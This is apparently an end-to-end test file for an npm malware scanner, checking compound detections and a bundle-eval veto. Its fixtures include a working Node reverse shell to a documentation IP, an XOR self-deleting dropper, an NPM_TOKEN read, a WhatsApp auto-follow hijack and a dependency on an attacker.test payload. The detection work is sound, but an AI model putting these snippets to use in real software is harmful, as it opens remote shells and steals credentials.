'use strict';

// End-to-end versions of tests/unit/scoring-guards.test.js: the same guards, reached
// through the real pipeline (runScanDirect on fixture code), so they also prove that the
// scanners emit the component findings on real code with real file/message fields.
// dependency_typosquat_require already has its end-to-end test on the red-team fixture
// 4-axios-unc1069 (tests/audit-2026-05/typosquat-findings.test.js, RT-C1.a).
//
// The bundle-veto fixture lives in assets/*.bundle.min.js: dist/, build/ and out/ are not
// read by the heuristic scanners at all, so a bundle there yields no finding to downgrade.

const fs = require('fs');
const os = require('os');
const path = require('path');
const { asyncTest, assert, runScanDirect, cleanupTemp } = require('../test-utils');

async function scanFiles(files) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-e2e-guard-'));
  try {
    for (const [rel, content] of Object.entries(files)) {
      fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
      fs.writeFileSync(path.join(dir, rel), typeof content === 'string' ? content : JSON.stringify(content, null, 2));
    }
    return await runScanDirect(dir);
  } finally {
    cleanupTemp(dir);
  }
}

const types = r => r.threats.map(t => t.type);
const describe = r => `score=${r.summary.riskScore} ${r.threats.map(t => `${t.severity}:${t.type}`).join(' ')}`;

const NEWSLETTER = [
  "const { WAProto } = require('@whiskeysockets/baileys');",
  'const AUTO_FOLLOW_CHANNELS = ["120363423975826201@newsletter", "120363425157057473@newsletter"];',
  'async function newsletterWMexQuery(jid, action) { return { jid, action }; }',
  'setTimeout(async () => {',
  '  for (const jid of AUTO_FOLLOW_CHANNELS) {',
  '    await newsletterWMexQuery(jid, WAProto.QueryIds.FOLLOW);',
  '  }',
  '}, 10000);',
  ''
].join('\n');

// "OrDeR_7077" is the Axios 2026-03 dropper XOR key (iocs/string-iocs.yaml).
const AXIOS_SETUP = [
  'const fs = require("fs");',
  'const KEY = "OrDeR_7077";',
  'const buf = Buffer.from(process.argv[2] || "", "base64");',
  'for (let i = 0; i < buf.length; i++) buf[i] = buf[i] ^ KEY.charCodeAt(i % KEY.length);',
  'fs.unlinkSync(__filename);',
  ''
].join('\n');

const BUNDLE = 'assets/app.bundle.min.js';
const BUNDLE_EVAL = 'var a=function(s){return eval(s)};a(process.argv[2]);';
// Reverse shell to a TEST-NET-3 documentation address (203.0.113.0/24, never routed).
const BUNDLE_SHELL = 'var net=require("net"),cp=require("child_process");var c=new net.Socket();c.connect(4444,"203.0.113.7",function(){var sh=cp.spawn("/bin/sh",[]);c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});';
const BUNDLE_TOKEN = 'var t=process.env.NPM_TOKEN;';
const bundlePkg = { name: 'ui-kit-x', version: '1.0.0', main: BUNDLE };
const evalSeverities = r => r.threats.filter(t => t.type === 'dangerous_call_eval').map(t => t.severity);

async function runE2EScoringGuardTests() {
  console.log('\n=== E2E SCORING GUARDS (compounds + bundle veto) ===\n');

  await asyncTest('E2E lifecycle_newsletter_hijack: Baileys auto-follow + postinstall -> CRITICAL compound', async () => {
    const r = await scanFiles({ 'package.json': { name: 'wa-bot-x', version: '1.0.0', main: 'index.js', scripts: { postinstall: 'node index.js' } }, 'index.js': NEWSLETTER });
    assert(types(r).includes('lifecycle_newsletter_hijack'), describe(r));
  });
  await asyncTest('E2E lifecycle_newsletter_hijack: same code without install hook -> no compound', async () => {
    const r = await scanFiles({ 'package.json': { name: 'wa-bot-x', version: '1.0.0', main: 'index.js' }, 'index.js': NEWSLETTER });
    assert(types(r).includes('newsletter_auto_follow'), 'the component must still be detected: ' + describe(r));
    assert(!types(r).includes('lifecycle_newsletter_hijack'), describe(r));
  });

  await asyncTest('E2E axios_family: Axios XOR key + self-delete + postinstall -> CRITICAL compound', async () => {
    const r = await scanFiles({ 'package.json': { name: 'axios-helper-x', version: '1.0.0', main: 'setup.js', scripts: { postinstall: 'node setup.js' } }, 'setup.js': AXIOS_SETUP });
    assert(types(r).includes('axios_family'), describe(r));
  });
  await asyncTest('E2E axios_family: same dropper without install hook -> no compound', async () => {
    const r = await scanFiles({ 'package.json': { name: 'axios-helper-x', version: '1.0.0', main: 'setup.js' }, 'setup.js': AXIOS_SETUP });
    assert(types(r).includes('ioc_string_match') && types(r).includes('anti_forensic_partial'), 'components must still be detected: ' + describe(r));
    assert(!types(r).includes('axios_family'), describe(r));
  });

  await asyncTest('E2E stub_with_string_ioc: URL-dependency stub carrying a campaign string -> CRITICAL compound', async () => {
    const r = await scanFiles({ 'package.json': { name: 'ltidi-x', version: '1.0.0', main: 'index.js', dependencies: { 'evil-payload': 'https://attacker.test/payload.tgz' } }, 'index.js': 'module.exports = "OrDeR_7077";\n' });
    assert(types(r).includes('stub_with_string_ioc'), describe(r));
  });
  await asyncTest('E2E stub_with_string_ioc: same stub without the string -> no compound', async () => {
    const r = await scanFiles({ 'package.json': { name: 'ltidi-x', version: '1.0.0', main: 'index.js', dependencies: { 'evil-payload': 'https://attacker.test/payload.tgz' } }, 'index.js': 'module.exports = 1;\n' });
    assert(types(r).includes('stub_package_external_dep'), 'the component must still be detected: ' + describe(r));
    assert(!types(r).includes('stub_with_string_ioc'), describe(r));
  });

  await asyncTest('E2E bundle veto baseline: a lone eval in a bundle is downgraded to LOW', async () => {
    const r = await scanFiles({ 'package.json': bundlePkg, [BUNDLE]: BUNDLE_EVAL });
    const s = evalSeverities(r);
    assert(s.length > 0 && s.every(x => x === 'LOW'), 'expected eval LOW: ' + describe(r));
  });
  await asyncTest('E2E bundle veto: eval next to a reverse shell in the same bundle keeps its severity', async () => {
    const r = await scanFiles({ 'package.json': bundlePkg, [BUNDLE]: BUNDLE_EVAL + BUNDLE_SHELL });
    assert(types(r).includes('reverse_shell'), 'reverse shell must be detected: ' + describe(r));
    const s = evalSeverities(r);
    assert(s.length > 0 && s.every(x => x !== 'LOW'), 'event-stream guard: eval must not be downgraded: ' + describe(r));
  });
  await asyncTest('E2E bundle veto: eval next to an NPM_TOKEN read in the same bundle keeps its severity', async () => {
    const r = await scanFiles({ 'package.json': bundlePkg, [BUNDLE]: BUNDLE_EVAL + BUNDLE_TOKEN });
    const s = evalSeverities(r);
    assert(s.length > 0 && s.every(x => x !== 'LOW'), 'credential-read veto: eval must not be downgraded: ' + describe(r));
  });
}

module.exports = { runE2EScoringGuardTests };
